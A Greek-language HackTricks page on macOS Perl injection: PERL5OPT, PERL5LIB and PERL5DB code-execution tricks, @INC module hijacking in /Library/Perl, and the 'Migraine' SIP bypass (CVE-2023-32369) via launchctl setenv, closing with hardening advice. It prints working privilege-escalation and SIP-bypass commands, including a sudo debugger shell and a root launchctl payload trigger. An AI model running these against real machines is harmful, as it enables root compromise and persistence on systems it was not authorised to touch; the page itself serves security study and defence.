# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Μέσω της μεταβλητής περιβάλλοντος `PERL5OPT` & `PERL5LIB`

Χρησιμοποιώντας τη μεταβλητή περιβάλλοντος **`PERL5OPT`**, είναι δυνατόν να κάνετε το **Perl** να εκτελεί αυθαίρετες εντολές όταν ξεκινά ο διερμηνέας (ακόμα και **πριν** από την πρώτη γραμμή του στοχευμένου σεναρίου αναλυθεί).
Για παράδειγμα, δημιουργήστε αυτό το σενάριο:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Τώρα **εξάγετε τη μεταβλητή env** και εκτελέστε το **perl** σενάριο:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Μια άλλη επιλογή είναι να δημιουργήσετε ένα Perl module (π.χ. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Και στη συνέχεια χρησιμοποιήστε τις μεταβλητές env ώστε το module να εντοπίζεται και να φορτώνεται αυτόματα:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Άλλες ενδιαφέρουσες μεταβλητές περιβάλλοντος

* **`PERL5DB`** – όταν ο διερμηνέας ξεκινά με την επιλογή **`-d`** (debugger), το περιεχόμενο του `PERL5DB` εκτελείται ως κώδικας Perl *μέσα* στο πλαίσιο του debugger. 
Αν μπορείτε να επηρεάσετε τόσο το περιβάλλον **όσο** και τις επιλογές γραμμής εντολών μιας προνομιακής διαδικασίας Perl, μπορείτε να κάνετε κάτι σαν:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # θα ανοίξει ένα shell πριν εκτελέσει το script
```

* **`PERL5SHELL`** – στα Windows αυτή η μεταβλητή ελέγχει ποιο εκτελέσιμο shell θα χρησιμοποιήσει το Perl όταν χρειάζεται να δημιουργήσει ένα shell. Αναφέρεται εδώ μόνο για πληρότητα, καθώς δεν είναι σχετική στο macOS.

Αν και το `PERL5DB` απαιτεί την επιλογή `-d`, είναι συνηθισμένο να βρίσκονται σενάρια συντήρησης ή εγκατάστασης που εκτελούνται ως *root* με αυτή την επιλογή ενεργοποιημένη για λεπτομερή αποσφαλμάτωση, καθιστώντας τη μεταβλητή έγκυρο μέσο κλιμάκωσης.

## Μέσω εξαρτήσεων (@INC abuse)

Είναι δυνατόν να καταγράψετε τη διαδρομή συμπερίληψης που θα αναζητήσει το Perl (**`@INC`**) εκτελώντας:
```bash
perl -e 'print join("\n", @INC)'
```
Τυπική έξοδος σε macOS 13/14 φαίνεται όπως:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Ορισμένοι από τους επιστρεφόμενους φακέλους δεν υπάρχουν καν, ωστόσο **`/Library/Perl/5.30`** υπάρχει, *δεν* προστατεύεται από το SIP και είναι *πριν* από τους φακέλους που προστατεύονται από το SIP. Επομένως, αν μπορείτε να γράψετε ως *root*, μπορείτε να ρίξετε ένα κακόβουλο module (π.χ. `File/Basename.pm`) που θα φορτωθεί *προτιμησιακά* από οποιοδήποτε προνομιακό script που εισάγει αυτό το module.

> [!WARNING]
> Χρειάζεστε ακόμα **root** για να γράψετε μέσα στο `/Library/Perl` και το macOS θα εμφανίσει ένα prompt **TCC** ζητώντας *Πλήρη Πρόσβαση Δίσκου* για τη διαδικασία που εκτελεί τη λειτουργία εγγραφής.

Για παράδειγμα, αν ένα script εισάγει **`use File::Basename;`**, θα ήταν δυνατό να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` που θα περιέχει κώδικα ελεγχόμενο από τον επιτιθέμενο.

## SIP bypass μέσω Migration Assistant (CVE-2023-32369 “Migraine”)

Τον Μάιο του 2023, η Microsoft αποκάλυψε το **CVE-2023-32369**, γνωστό ως **Migraine**, μια τεχνική post-exploitation που επιτρέπει σε έναν επιτιθέμενο *root* να παρακάμψει εντελώς την **Προστασία Ακεραιότητας Συστήματος (SIP)**. 
Το ευάλωτο συστατικό είναι το **`systemmigrationd`**, μια διεργασία που έχει δικαίωμα με **`com.apple.rootless.install.heritable`**. Οποιαδήποτε παιδική διαδικασία που δημιουργείται από αυτή τη διεργασία κληρονομεί το δικαίωμα και επομένως εκτελείται **εκτός** των περιορισμών του SIP.

Μεταξύ των παιδιών που εντοπίστηκαν από τους ερευνητές είναι ο ερμηνευτής υπογεγραμμένος από την Apple:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Επειδή το Perl σέβεται το `PERL5OPT` (και το Bash σέβεται το `BASH_ENV`), η δηλητηρίαση του *περιβάλλοντος* του δαίμονα είναι αρκετή για να αποκτήσετε αυθαίρετη εκτέλεση σε ένα περιβάλλον χωρίς SIP:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Όταν εκτελείται το `migrateLocalKDC`, το `/usr/bin/perl` ξεκινά με το κακόβουλο `PERL5OPT` και εκτελεί το `/private/tmp/migraine.sh` *πριν επανενεργοποιηθεί το SIP*. Από αυτό το σενάριο μπορείτε, για παράδειγμα, να αντιγράψετε ένα payload μέσα στο **`/System/Library/LaunchDaemons`** ή να αναθέσετε το εκτεταμένο χαρακτηριστικό `com.apple.rootless` για να κάνετε ένα αρχείο **μη διαγραφόμενο**.

Η Apple διόρθωσε το πρόβλημα στο macOS **Ventura 13.4**, **Monterey 12.6.6** και **Big Sur 11.7.7**, αλλά παλαιότερα ή μη ενημερωμένα συστήματα παραμένουν εκμεταλλεύσιμα.

## Συστάσεις σκληροποίησης

1. **Καθαρίστε επικίνδυνες μεταβλητές** – οι προνομιούχοι launchdaemons ή cron jobs θα πρέπει να ξεκινούν με ένα καθαρό περιβάλλον (`launchctl unsetenv PERL5OPT`, `env -i`, κ.λπ.).
2. **Αποφύγετε την εκτέλεση διερμηνέων ως root** εκτός αν είναι απολύτως απαραίτητο. Χρησιμοποιήστε συμπιεσμένα δυαδικά ή αποσύρετε τα προνόμια νωρίς.
3. **Προμηθευτείτε σενάρια με `-T` (λειτουργία taint)** ώστε το Perl να αγνοεί το `PERL5OPT` και άλλες μη ασφαλείς επιλογές όταν είναι ενεργοποιημένος ο έλεγχος taint.
4. **Διατηρήστε το macOS ενημερωμένο** – το “Migraine” είναι πλήρως ενημερωμένο στις τρέχουσες εκδόσεις.

## Αναφορές

- Microsoft Security Blog – “Νέα ευπάθεια macOS, Migraine, θα μπορούσε να παρακάμψει την Προστασία Ακεραιότητας Συστήματος” (CVE-2023-32369), 30 Μαΐου 2023.
- Hackyboiz – “Έρευνα παράκαμψης SIP macOS (PERL5OPT & BASH_ENV)”, Μάιος 2025.

{{#include ../../../banners/hacktricks-training.md}}
